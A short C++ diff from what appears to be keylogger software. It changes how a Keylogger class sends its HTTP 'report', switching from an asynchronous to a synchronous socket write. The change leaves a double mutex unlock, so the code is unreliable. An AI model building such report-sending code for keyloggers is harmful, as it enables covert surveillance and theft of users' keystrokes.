@@ -63,17 +63,23 @@ namespace http
 			_reply_buffer_ptr->headers[2].name = "Content-Length";
 			_reply_buffer_ptr->headers[2].value = std::to_string(_reply_buffer_ptr->content.size());
 
+			boost::system::error_code err;
 			socket_write_mutex_.lock();
-			async_write(socket_,
-				_reply_buffer_ptr->to_buffers(),
-				boost::bind(&Keylogger::handle_async_write_report,
-					this,
-					boost::asio::placeholders::error,
-					boost::asio::placeholders::bytes_transferred)
-				);
+			std::size_t bytes_sent = write(socket_, _reply_buffer_ptr->to_buffers(), err);
+			socket_write_mutex_.unlock();
+
+			handle_write_report(err, bytes_sent);
+
+			//async_write(socket_,
+			//	_reply_buffer_ptr->to_buffers(),
+			//	boost::bind(&Keylogger::handle_async_write_report,
+			//		this,
+			//		boost::asio::placeholders::error,
+			//		boost::asio::placeholders::bytes_transferred)
+			//	);
 		}
 
-		void Keylogger::handle_async_write_report(const boost::system::error_code& error, std::size_t bytes)
+		void Keylogger::handle_write_report(const boost::system::error_code& error, std::size_t bytes)
 		{
 			socket_write_mutex_.unlock();
 			if( error != error::operation_aborted)
